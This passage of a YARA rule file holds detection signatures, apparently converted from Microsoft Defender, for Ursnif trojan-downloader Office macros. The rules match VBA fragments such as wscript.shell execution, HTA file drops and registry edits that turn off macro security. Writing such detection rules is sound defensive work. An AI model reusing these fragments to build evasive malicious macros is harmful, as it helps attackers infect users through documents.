        $x_1_7 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e [0-32] 20 3d 20 22 47 45 54 22}  //weight: 1, accuracy: Low
        $x_1_8 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e [0-32] 20 26 20 4c 69 73 74 42 6f 78 31 2e 4c 69 73 74 28 33 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_9 = {53 68 65 6c 6c 21 20 22 22 20 2b 20 28 28 [0-32] 20 2b 20 22 20 22 20 26 20 [0-32] 29 29}  //weight: 1, accuracy: Low
        $x_1_10 = "= Len(\"ZZZ\") Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (9 of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AEF_2147776790_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AEF!MTB"
        threat_id = "2147776790"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".jpg\")" ascii //weight: 1
        $x_1_2 = "= \"C:\\users\\Public\\\" + \"xfe.png\"" ascii //weight: 1
        $x_1_3 = "Private Sub skuid_Change()" ascii //weight: 1
        $x_1_4 = "& ListBox1.List(3)" ascii //weight: 1
        $x_1_5 = "= Len(\"Z00\") Then" ascii //weight: 1
        $x_1_6 = "+ Trim(\"a\") + Trim(\"m\"))" ascii //weight: 1
        $x_1_7 = "ShellRunner.Run VarExQuery & RefArray" ascii //weight: 1
        $x_1_8 = "Public Sub OptionButton1_Click()" ascii //weight: 1
        $x_1_9 = "ListBox1.AddItem (CommandButton1.Tag)" ascii //weight: 1
        $x_1_10 = "ListBox1.AddItem (CheckBox1.Tag)" ascii //weight: 1
        $x_1_11 = "ListBox1.AddItem (Image1.ControlTipText)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AEG_2147777424_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AEG!MTB"
        threat_id = "2147777424"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set classList = classList.CreateTextFile(ptrPtr)" ascii //weight: 1
        $x_1_2 = "classList.WriteLine constArrayDocument" ascii //weight: 1
        $x_1_3 = "Public Sub CommandButton1_Click()" ascii //weight: 1
        $x_1_4 = "Set countIndex = CreateObject(\"w\" & script & \"shell\")" ascii //weight: 1
        $x_1_5 = "countIndex.exec frm.CommandButton1.Tag & \" c:\\users\\public\\main.hta" ascii //weight: 1
        $x_1_6 = "windowCopy = \"c:\\users\\public\\main.hta\"" ascii //weight: 1
        $x_1_7 = "removeLocal.mainClass windowCopy, repoQuery" ascii //weight: 1
        $x_1_8 = "Call frm.CommandButton1_Click" ascii //weight: 1
        $x_1_9 = "Function repoQuery()" ascii //weight: 1
        $x_1_10 = "Set genericDataTextbox = CreateObject(\"System.Text.StringBuilder\")" ascii //weight: 1
        $x_1_11 = "script = \"script\" & \"." ascii //weight: 1
        $x_1_12 = "genericDataTextbox.Append_3 \"" ascii //weight: 1
        $x_1_13 = "{return queryGlobalCaption.split('').reverse().join('');" ascii //weight: 1
        $x_1_14 = "classTableConst.Timeout = 60000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AEH_2147777437_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AEH!MTB"
        threat_id = "2147777437"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Sub CommandButton1_Click()" ascii //weight: 1
        $x_1_2 = ".exec frm.CommandButton1.Tag & \" c:\\users\\public\\main.hta\"" ascii //weight: 1
        $x_1_3 = "removeLocal.mainClass" ascii //weight: 1
        $x_1_4 = {43 61 6c 6c 20 66 72 6d 2e 43 6f 6d 6d 61 6e 64 42 75 74 74 6f 6e 31 5f 43 6c 69 63 6b 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = "= CreateObject(\"System.Text.StringBuilder\")" ascii //weight: 1
        $x_1_6 = "split('').reverse().join('');" ascii //weight: 1
        $x_1_7 = "Timeout = 60000" ascii //weight: 1
        $x_1_8 = {73 63 72 69 70 74 20 3d 20 22 73 63 72 69 70 74 22 20 26 20 22 2e 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_9 = ".Append_3 \"<div id='content'>fTtl" ascii //weight: 1
        $x_1_10 = "for(x=0;x<L;x++" ascii //weight: 1
        $x_1_11 = "9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA" ascii //weight: 1
        $x_1_12 = "varTextProcedure" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RV_2147777687_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RV!MTB"
        threat_id = "2147777687"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\").exec a" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 20 61 75 52 76 73 28 61 [0-5] 2c 20 61 [0-5] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4c 65 6e 28 61 [0-5] 29 20 3c 3e 20 34 20 54 68 65 6e 20 61 4a 36 76 53 68 20 3d 20 61 [0-5] 20 58 6f 72}  //weight: 1, accuracy: Low
        $x_1_4 = {61 32 61 4b 58 28 61 4a 36 76 53 68 28 61 [0-5] 28 61 [0-5] 29 2c 20 31 31 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {53 70 6c 69 74 28 61 [0-5] 2c 20 32 35 36 29}  //weight: 1, accuracy: Low
        $x_1_6 = "result + Chr(theRot13Code)" ascii //weight: 1
        $x_1_7 = "myfrm1.text1.text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AEJ_2147777706_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AEJ!MTB"
        threat_id = "2147777706"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Sub CommandButton1_Click()" ascii //weight: 1
        $x_1_2 = ".exec frm.CommandButton1.Tag & \" c:\\users\\public\\main.hta\"" ascii //weight: 1
        $x_1_3 = "Option Explicit" ascii //weight: 1
        $x_1_4 = "Public Sub sizeRight" ascii //weight: 1
        $x_1_5 = "= \"c:\\users\\public\\main.hta\"" ascii //weight: 1
        $x_1_6 = "Call frm.CommandButton1_Click" ascii //weight: 1
        $x_1_7 = ".Append_3 \"<div id='content'>fTtl" ascii //weight: 1
        $x_1_8 = "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA" ascii //weight: 1
        $x_1_9 = "for(x=0;x<L;x++" ascii //weight: 1
        $x_1_10 = "= CreateObject(\"System.Text.StringBuilder\")" ascii //weight: 1
        $x_1_11 = "split('').reverse().join('');" ascii //weight: 1
        $x_1_12 = "Timeout = 60000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BKH_2147777863_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BKH!MTB"
        threat_id = "2147777863"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "namespaceEx.exec frm.CommandButton1.Tag & \" c:\\users\\public\\main.hta\"" ascii //weight: 1
        $x_1_2 = "script = \"script\" & \".\"" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"w\" & script & \"shell\")" ascii //weight: 1
        $x_1_4 = "Call frm.CommandButton1_Click" ascii //weight: 1
        $x_1_5 = "buttonException.Append_3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RVA_2147779038_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RVA!MTB"
        threat_id = "2147779038"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = "= ActiveDocument.BuiltInDocumentProperties(\"title\")" ascii //weight: 1
        $x_1_3 = {3c 68 74 6d 6c 3e 3c 62 6f 64 79 3e 3c 64 69 76 [0-6] 69 64 3d 27 63 6f 6e 74 65 6e 74 27 3e 66 54}  //weight: 1, accuracy: Low
        $x_1_4 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_5 = "frm.button1_Click" ascii //weight: 1
        $x_1_6 = {43 6c 6f 73 65 20 23 31 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_FTIV_2147780164_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.FTIV!MTB"
        threat_id = "2147780164"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_3 = {2e 65 78 65 63 20 74 67 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = "frm.button1_Click" ascii //weight: 1
        $x_1_5 = "= Split(frm.tg, \" \")" ascii //weight: 1
        $x_1_6 = "<html><body><div\" + \" id='content'>fT" ascii //weight: 1
        $x_1_7 = {43 6c 6f 73 65 20 23 31 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_VIS_2147780613_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.VIS!MTB"
        threat_id = "2147780613"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "HKEY_CUR\" & StrReverse(\"rawtfoS\\RESU_TNER\") & \"e\\Microsoft\\Office\\\"" ascii //weight: 1
        $x_1_2 = "Word\\Secur\" & StrReverse(\"VsseccA\\yti\") & \"BOM" ascii //weight: 1
        $x_1_3 = {2e 52 65 67 57 72 69 74 65 20 [0-80] 2c 20 31 2c 20 22 52 45 47 5f 44 57 4f 52 44 22}  //weight: 1, accuracy: Low
        $x_1_4 = "Sub swapConstTrust()" ascii //weight: 1
        $x_1_5 = "Function optionDatabase() As String" ascii //weight: 1
        $x_1_6 = {73 77 61 70 41 72 67 75 6d 65 6e 74 50 74 72 28 22 [0-80] 22 29}  //weight: 1, accuracy: Low
        $x_1_7 = "= StrReverse(UserForm1.TextBox1)" ascii //weight: 1
        $x_1_8 = "iteratorLoad" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_VI_2147787710_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.VI!MTB"
        threat_id = "2147787710"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "l77Z69u46k82b73p70z40i34h10934V59H57i48F41R10678f79N77e69Q46U82u73i70g40a34s68p3" ascii //weight: 1
        $x_1_2 = "4M59i34G92M34I41U10678X79m77H69J46S82c73X70A40Q34j11234D59W34Q48" ascii //weight: 1
        $x_1_3 = "G34m41v10678v79t77y69j46c82k73O70b40a34q75u34x59o34N11934d41V10678F79n77q69K46n8" ascii //weight: 1
        $x_1_4 = "79N77H69Z46I82f73P70Z40f34b10434n59E34T11034a41c10678l79J77E69h4" ascii //weight: 1
        $x_1_5 = "6j82Q73W70p40x34n76S34O59O73N78S68D73J67R69h40I8" ascii //weight: 1
        $x_1_6 = "U73J70d40U34K10510234Y59j67R79R68E73E67g69o46B67" ascii //weight: 1
        $x_1_7 = "d65w82c65A84S84e40S49P49J53c41Z41v10678f79q77w69" ascii //weight: 1
        $x_1_8 = "s46D82U73V70r40s34C86Z34G59k34A97g34m41G10678O79" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_FTIX_2147793365_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.FTIX!MTB"
        threat_id = "2147793365"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "soPho = d_ko & \"R\" & \"I\"" ascii //weight: 1
        $x_1_2 = "Sw = 4: Sheets(1).Cells(17, 1).FormulaLocal = soPho & Rounts" ascii //weight: 1
        $x_1_3 = "Excel4MacroSheets.Add Before:=Worksheets(tol): emm" ascii //weight: 1
        $x_1_4 = "tb = 5: mthh = (haBii(d_ko & fk, 1 + tb)): x = tol: remmiosf (112)" ascii //weight: 1
        $x_1_5 = "Vaarmi = coppP & \"RN\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_FTIY_2147793366_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.FTIY!MTB"
        threat_id = "2147793366"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "nio = ko: Run (\"\" & \"A\" & 3)" ascii //weight: 1
        $x_1_2 = "For Each zaa In ChartSs(\"\" & Cells(80, 4), 3)" ascii //weight: 1
        $x_1_3 = "BioEnima = Split(Tk, \"y\")" ascii //weight: 1
        $x_1_4 = "d_ko = \"c\": d_ko = \"=\"" ascii //weight: 1
        $x_1_5 = "Sheets(1).[A5].FormulaLocal = qq" ascii //weight: 1
        $x_1_6 = "RjL = RjL + 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_ABC_2147793941_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.ABC!MTB"
        threat_id = "2147793941"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ro = yep: Run (\"\" & \"A\" & 3)" ascii //weight: 1
        $x_1_2 = "Excel4MacroSheets.Add(Before:=Worksheets((1))).Name = Lowe: Fisolo" ascii //weight: 1
        $x_1_3 = "s = s: Sheets(1).[A5].FormulaLocal = ed" ascii //weight: 1
        $x_1_4 = "VasDemo = Split(i, \"y\")" ascii //weight: 1
        $x_1_5 = "Function hhieigh()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_ABK_2147794277_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.ABK!MTB"
        threat_id = "2147794277"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub zoom_del_foglio()" ascii //weight: 1
        $x_1_2 = "s = s: Sheets(1).[A5].FormulaLocal = ed" ascii //weight: 1
        $x_1_3 = "Excel4MacroSheets.Add(Before:=Worksheets((1))).Name = anndy: Lamdaa" ascii //weight: 1
        $x_1_4 = "= yep: Run (\"\" & \"A\" & 3)" ascii //weight: 1
        $x_1_5 = "creeror = Split(r, \"j\")" ascii //weight: 1
        $x_1_6 = "iooos = hhieigh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_UCMM_2147797032_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.UCMM!MTB"
        threat_id = "2147797032"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Function Mali_i(R As String, S As Long) As Variant" ascii //weight: 1
        $x_1_2 = "Attribute VB_Name = \"Questa_cartella_di_lavoro" ascii //weight: 1
        $x_1_3 = "ReDim L(0 To CLng((Aii(R) / S) - 1))" ascii //weight: 1
        $x_1_4 = "For E = 1 To Aii(R) Step S" ascii //weight: 1
        $x_1_5 = "L(F) = Mid(R, E, S): F = F + 1" ascii //weight: 1
        $x_1_6 = "Function versione(un As String, u As Integer)" ascii //weight: 1
        $x_1_7 = "u = R: Sheets(1).[F4].FormulaLocal = un" ascii //weight: 1
        $x_1_8 = "nostri = Lmeet & \"R\" & \"I\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_UCMN_2147797033_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.UCMN!MTB"
        threat_id = "2147797033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Run (\"\" & \"F\" & 3)" ascii //weight: 1
        $x_1_2 = "per_u = Split(j, \"\" & \"b\")" ascii //weight: 1
        $x_1_3 = "Lmeet = Ecco_la: Lmeet = \"=\"" ascii //weight: 1
        $x_1_4 = "Questo = \"T\" & inglese & \"O\" & \"()" ascii //weight: 1
        $x_1_5 = "inglese = Ecco_la & \"RN" ascii //weight: 1
        $x_1_6 = "Excel4MacroSheets.Add(Before:=Worksheets((1))).Name = Ecco_la: l_esperienza" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RVC_2147799538_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RVC!MTB"
        threat_id = "2147799538"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-100] 29 2e 43 72 65 61 74 65 20 47 6c 65 6d 53 28 22 22 20 26 20 46 69 6e 47 6f 31 29 2c 20 [0-4] 2c 20 [0-4] 2c 20 70 69 64}  //weight: 1, accuracy: Low
        $x_1_2 = "MaDs(Seeds(\"12213413413013307606506512312" ascii //weight: 1
        $x_1_3 = "Int(896666 * Rnd) + 2666" ascii //weight: 1
        $x_1_4 = {56 56 65 73 6d 75 53 28 30 2c 20 72 74 2c 20 6a 75 2c 20 30 2c 20 30 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
        $x_1_5 = {3d 20 43 68 72 28 64 78 20 2d 20 6b 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BSK_2147811102_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BSK!MTB"
        threat_id = "2147811102"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Run((((((((((\"O\" & \"4\" & \"\")" ascii //weight: 1
        $x_1_2 = "= Split(esperienzaA, \"z\")" ascii //weight: 1
        $x_1_3 = {3d 20 70 6f 74 72 65 6d 6d 6f 28 30 20 2b 20 [0-18] 2c 20 22 22 20 26 20 [0-18] 29 3a 20 72 69 67 75 61 72 64 61}  //weight: 1, accuracy: Low
        $x_1_4 = "Sheets(msoGradientHorizontal).Cells(37, 15).FormulaLocal =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_ALA_2147811114_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.ALA!MTB"
        threat_id = "2147811114"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Xttime = ((((((((((Run((((((((((\"I\" & \"4\" & \"\"))))))))))))))))))))" ascii //weight: 1
        $x_1_2 = {46 75 6e 63 74 69 6f 6e 20 4e 6f 75 76 61 50 50 28 64 20 41 73 20 53 74 72 69 6e 67 2c 20 7a 20 41 73 20 49 6e 74 65 67 65 72 29 0d 0a 66 66 20 3d 20 52 69 67 68 74 28 64 2c 20 4c 65 6e 28 64 29 20 2d 20 7a 29 0d 0a 4e 6f 75 76 61 50 50 20 3d 20 4c 65 66 74 28 66 66 2c 20 4c 65 6e 28 66 66 29 20 2d 20 7a 29}  //weight: 1, accuracy: High
        $x_1_3 = "Sheets(msoLineSingle).Cells(37, 9).FormulaLocal = HonN & forcer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PDA_2147811701_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PDA!MTB"
        threat_id = "2147811701"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Run((((((((((\"\" & \"I\" & tp & \"\")))))" ascii //weight: 1
        $x_1_2 = "= Split(hioT, \"?\")" ascii //weight: 1
        $x_1_3 = "Sheets(msoLineSingle).Cells(30 + 7, 3 * 3).FormulaLocal = VVoo & forcer" ascii //weight: 1
        $x_1_4 = "= Vmore(0 + y, \"\" & y + 7): hKio" ascii //weight: 1
        $x_1_5 = "= f & CaPoo(\"\" & p, p.Column)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RVD_2147816308_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RVD!MTB"
        threat_id = "2147816308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "GetObject(ppR).Get(IU)" ascii //weight: 1
        $x_1_2 = {4d 4d 61 4b 2e 4f 70 65 6e 20 [0-25] 2c 20 56 69 55 2c 20 46 61 6c 73 65 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "out(nPJs(i), j) = Mid$(MillW, k, 1)" ascii //weight: 1
        $x_1_4 = "Gguida(\"aEX2MT.01MM.LT6OGSLXHP.\")" ascii //weight: 1
        $x_1_5 = "Traduce(Gguida(\"Qhp/onco_Jts/ma.m>\\t:daic\"), m)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PDB_2147817672_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PDB!MTB"
        threat_id = "2147817672"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(\"Temp\") & \"\\\" & ty & \".\"" ascii //weight: 1
        $x_1_2 = "= Split(Range(\"I79:I79\"), \",\")" ascii //weight: 1
        $x_1_3 = "= HiiJii(\"\" & vSxeeD):" ascii //weight: 1
        $x_1_4 = "= ErjOki(DD, DSw)" ascii //weight: 1
        $x_1_5 = "= Bn: Application.Quit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AG_2147817984_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AG!MSR"
        threat_id = "2147817984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Function RunFE() As Long" ascii //weight: 1
